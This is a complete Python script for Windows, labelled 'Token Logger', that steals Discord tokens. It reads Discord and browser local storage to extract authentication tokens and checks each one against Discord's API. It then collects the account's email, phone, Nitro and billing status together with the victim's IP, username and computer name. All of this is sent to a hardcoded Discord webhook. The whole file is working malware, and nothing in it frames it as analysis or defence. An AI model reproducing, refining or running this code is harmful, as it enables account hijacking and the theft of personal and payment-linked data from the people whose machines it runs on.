import os
import re
import json
import time
import base64
import urllib.request
from urllib.request import Request, urlopen
from threading import Thread
from datetime import datetime
from sys import argv

def Auth():
    WEBHOOK = "https://discord.com/api/webhooks/1390083160867606650/Y4zeQxdjAhOwckaKfQ9v9o4tAdbMhUcUBQb668-IRSVe8Q2tTM-U-TwO0PgKzaibixjh"

    if os.name != "nt":
        print("Ce script est prévu pour Windows uniquement.")
        return

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        "Discord"           : os.path.join(ROAMING, "Discord"),
        "Discord Canary"    : os.path.join(ROAMING, "discordcanary"),
        "Discord PTB"       : os.path.join(ROAMING, "discordptb"),
        "Google Chrome"     : os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
        "Opera"             : os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Brave"             : os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex"            : os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default")
    }

    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def getuserdata(token):
        try:
            req = Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))
            with urlopen(req) as response:
                return json.load(response)
        except:
            return None

    def gettokens(path):
        path = os.path.join(path, "Local Storage", "leveldb")
        tokens = []
        if not os.path.exists(path):
            return tokens
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            file_path = os.path.join(path, file_name)
            try:
                with open(file_path, errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
                            matches = re.findall(regex, line)
                            tokens.extend(matches)
            except Exception as e:
                pass
        return tokens

    def getip():
        try:
            with urlopen(Request("https://api.ipify.org")) as response:
                return response.read().decode().strip()
        except:
            return "Unknown"

    embeds = []
    checked_tokens = []
    working_ids = set()

    ip = getip()
    pc_username = os.getenv("UserName") or "Unknown"
    pc_name = os.getenv("COMPUTERNAME") or "Unknown"

    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        tokens = gettokens(path)
        for token in tokens:
            if token in checked_tokens:
                continue
            checked_tokens.append(token)

            # Decode user ID from token
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = base64.b64decode(token.split(".")[0] + "===").decode()
                except Exception:
                    uid = None

            if uid in working_ids:
                continue

            user_data = getuserdata(token)
            if not user_data:
                continue

            working_ids.add(uid)

            username = f"{user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0000')}"
            user_id = user_data.get("id", "Unknown")
            email = user_data.get("email", "Unknown")
            phone = user_data.get("phone", "Unknown")
            nitro = bool(user_data.get("premium_type", 0))

            # Check billing info presence (true/false)
            billing = False
            try:
                req_billing = Request(
                    "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                    headers=getheaders(token)
                )
                with urlopen(req_billing) as resp:
                    data = json.load(resp)
                    billing = bool(len(data) > 0)
            except:
                pass

            embed = {
                "color": 0x7289da,
                "author": {"name": f"{username} ({user_id})"},
                "fields": [
                    {"name": "**Account Info**",
                     "value": f"Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}",
                     "inline": True},
                    {"name": "**PC Info**",
                     "value": f"IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform_name}",
                     "inline": True},
                    {"name": "**Token**", "value": token, "inline": False}
                ],
                "footer": {"text": "Token Logger"},
                "timestamp": datetime.utcnow().isoformat()
            }
            embeds.append(embed)

    if not embeds:
        print("Aucun token valide trouvé.")
        return

    webhook_data = {
        "content": "",
        "username": "Token Logger",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
        "embeds": embeds
    }

    try:
        data = json.dumps(webhook_data).encode()
        req = Request(WEBHOOK, data=data, headers=getheaders())
        with urlopen(req) as response:
            print("Webhook envoyé, status:", response.status)
    except Exception as e:
        print("Erreur en envoyant le webhook:", e)

if __name__ == "__main__":
    Auth()
